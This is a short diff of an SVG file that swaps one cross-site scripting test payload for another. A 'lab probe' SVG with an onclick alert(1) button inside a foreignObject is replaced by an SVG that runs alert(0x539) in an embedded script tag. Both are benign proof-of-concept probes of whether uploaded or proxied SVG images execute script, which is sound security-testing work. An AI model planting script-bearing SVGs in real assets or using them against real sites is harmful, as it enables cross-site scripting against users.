@@ -1,11 +1,6 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!-- Lab probe: foreignObject + HTML — alert() only when this SVG is opened as a document (e.g. tab URL), not via &lt;img&gt; / image-proxy raster. -->
-<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 128 128">
-  <circle cx="64" cy="64" r="56" fill="#44403c"/>
-  <foreignObject x="8" y="40" width="112" height="48">
-    <div xmlns="http://www.w3.org/1999/xhtml">
-      <button type="button" style="font:11px sans-serif" onclick="alert(1)">alert(1)</button>
-    </div>
-  </foreignObject>
-  <text x="64" y="28" fill="#fafaf9" font-size="9" text-anchor="middle">foreignObject+onclick</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
+<rect width="124" height="124" rx="24" fill="#000000"/>
+   <script type="text/javascript">  
+      alert(0x539);
+   </script>
 </svg>
